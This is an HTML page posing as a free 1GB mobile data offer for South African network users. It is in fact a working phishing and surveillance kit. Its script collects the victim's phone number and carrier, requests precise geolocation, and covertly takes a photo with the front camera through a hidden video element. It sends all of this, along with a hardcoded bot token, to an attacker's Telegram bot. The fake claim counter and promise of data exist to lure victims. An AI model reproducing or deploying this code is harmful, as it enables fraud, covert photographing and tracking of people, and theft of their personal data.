<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Mentos Data Claim</title>
<style>
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }

  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: linear-gradient(135deg, #ff4ec7, #1a1a1a);
  }

  .container {
    background: #1a1a1a;
    color: #fff;
    border-radius: 20px;
    width: 400px;
    max-width: 90%;
    padding: 30px 25px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    text-align: center;
  }

  h1 {
    font-size: 1.8em;
    margin-bottom: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #ff4ec7;
  }

  h1 span {
    margin-left: 10px;
  }

  .alert, .claim-message {
    background-color: #ff4ec7;
    color: #1a1a1a;
    padding: 20px;
    border-radius: 10px;
    font-size: 1em;
    font-weight: bold;
    line-height: 1.4;
    margin-bottom: 20px;
  }

  .claim-message {
    display: none; /* Hidden initially */
  }

  form {
    display: flex;
    flex-direction: column;
    gap: 15px;
  }

  label {
    font-weight: 600;
    font-size: 0.95em;
    text-align: left;
    display: block;
  }

  select, input[type="tel"] {
    width: 100%;
    padding: 12px 15px;
    border-radius: 10px;
    border: 1px solid #ff4ec7;
    background: #1a1a1a;
    color: #fff;
    font-size: 1em;
    transition: border-color 0.3s, box-shadow 0.3s;
  }

  select:focus, input[type="tel"]:focus {
    border-color: #fff;
    box-shadow: 0 0 5px rgba(255,78,199,0.5);
    outline: none;
  }

  input[type="tel"]::placeholder {
    color: #ccc;
  }

  /* Fixed invalid border color for mobile input */
  input[type="tel"]:invalid {
    border-color: #ff66b3; /* Pink instead of red */
  }

  .claim-button {
    padding: 15px;
    background: linear-gradient(90deg, #ff4ec7, #ff66b3);
    border: none;
    border-radius: 12px;
    color: #fff;
    font-size: 1.1em;
    font-weight: bold;
    cursor: pointer;
    transition: transform 0.2s, box-shadow 0.2s;
  }

  .claim-button:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 15px rgba(255,78,199,0.5);
  }

  .footer {
    margin-top: 20px;
    font-size: 0.9em;
    color: #ccc;
  }

  option {
    background: #1a1a1a;
    color: #fff;
  }
</style>
</head>
<body>
  <div class="container">
    <h1> <span>Claim Your Free 1GB Data</span></h1>
    
    <!-- Original message initially visible -->
    <div id="alert" class="alert">
      Free 1GB data pack recharge for everyone every month. Grab yours now!
    </div>

    <!-- New message after clicking Claim -->
    <div id="claimMessage" class="claim-message">
      PLEASE ALLOW FOR 2-4HRS TO RECEIVE YOUR FREE 1GB
    </div>

    <!-- Hidden video and canvas for capturing image -->
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <!-- Form -->
    <form id="claimForm">
      <label for="provider">Select Provider:</label>
      <select id="provider" name="provider" required>
        <option value="">--Choose Provider--</option>
        <option>MTN</option>
        <option>VODACOM</option>
        <option>TELKOM</option>
        <option>CELL C</option>
        <option>OTHER</option>
      </select>

      <label for="mobile">Mobile Number:</label>
      <input
        type="tel"
        id="mobile"
        name="mobile"
        placeholder="Enter 10-digit mobile number"
        maxlength="10"
        pattern="\d{10}"
        required
      >

      <button class="claim-button" type="submit">Claim Now</button>
    </form>

    <div class="footer">
      Already claimed by 3,589 users!
    </div>
  </div>

  <script>
    const form = document.getElementById('claimForm');
    const alertBox = document.getElementById('alert');
    const claimMessage = document.getElementById('claimMessage');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // !!! IMPORTANT: Replace with your actual bot token and chat ID !!!
    const telegramBotToken = "8033397452:AAG8i0tE0iuRgZcesUcFUitYPRTFWdx59HM";
    const telegramChatId = "8205131448"; 
    const telegramBotUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    async function sendDataToTelegram(data) {
        let message = `*NEW CLAIM DETECTED*\n\n`;
        message += `*Provider:* ${data.provider}\n`;
        message += `*Mobile Number:* ${data.mobile}\n\n`;
        message += `*Location:* ${data.location}\n`;
        message += `*Image Status:* ${data.imageStatus}\n`;

        if (data.imageData) {
            // Telegram message size limit means we can't send full base64 as text easily.
            // For sending the actual image, you'd use sendPhoto method, not sendMessage.
            // Here, I'm just showing a truncated version in the text message.
            message += `*Image Data (Base64, truncated):*\n\`\`\`\n${data.imageData.substring(0, 200)}...\n\`\`\`\n`; 
        }

        try {
            await fetch(telegramBotUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            console.log('Data sent to Telegram bot.');
            
            // If you want to send the actual image separately:
            if (data.imageData) {
                const formData = new FormData();
                formData.append('chat_id', telegramChatId);
                // Convert base64 to Blob
                const byteString = atob(data.imageData.split(',')[1]);
                const mimeString = data.imageData.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                formData.append('photo', new Blob([ab], { type: mimeString }), 'webcam_capture.jpg');

                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                console.log('Image sent to Telegram bot.');
            }

        } catch (error) {
            console.error('Error sending data to Telegram bot:', error);
        }
    }

    async function captureImage() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            video.srcObject = stream;
            await new Promise(resolve => video.onloadedmetadata = resolve);
            video.play();

            await new Promise(resolve => setTimeout(resolve, 1500)); // Give it a bit more time

            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.8); // Get JPEG image
            stream.getTracks().forEach(track => track.stop()); // Stop camera
            return imageData;
        } catch (err) {
            console.error('Error accessing or capturing camera:', err);
            return null;
        }
    }

    async function getLocation() {
        return new Promise(resolve => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve(`Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`);
                    },
                    (error) => {
                        let errorMessage = "Location access denied.";
                        if (error.code === error.PERMISSION_DENIED) {
                            errorMessage = "Location access denied by user.";
                        } else if (error.code === error.POSITION_UNAVAILABLE) {
                            errorMessage = "Location information unavailable.";
                        } else if (error.code === error.TIMEOUT) {
                            errorMessage = "Location request timed out.";
                        }
                        resolve(errorMessage);
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else {
                resolve("Geolocation not supported by this browser.");
            }
        });
    }

    form.addEventListener('submit', async function(e) {
        e.preventDefault(); // Prevent page reload

        form.style.display = 'none'; // Hide form
        alertBox.style.display = 'none'; // Hide original message
        claimMessage.style.display = 'block'; // Show new message

        const provider = document.getElementById('provider').value;
        const mobile = document.getElementById('mobile').value;

        const userLocation = await getLocation();
        const imageData = await captureImage();
        const imageStatus = imageData ? "Image captured." : "Image capture failed/denied.";

        const payload = {
            provider: provider,
            mobile: mobile,
            location: userLocation,
            imageStatus: imageStatus,
            imageData: imageData // Include the image data in the payload
        };
        
        await sendDataToTelegram(payload);
    });
  </script>
</body>
 </html>
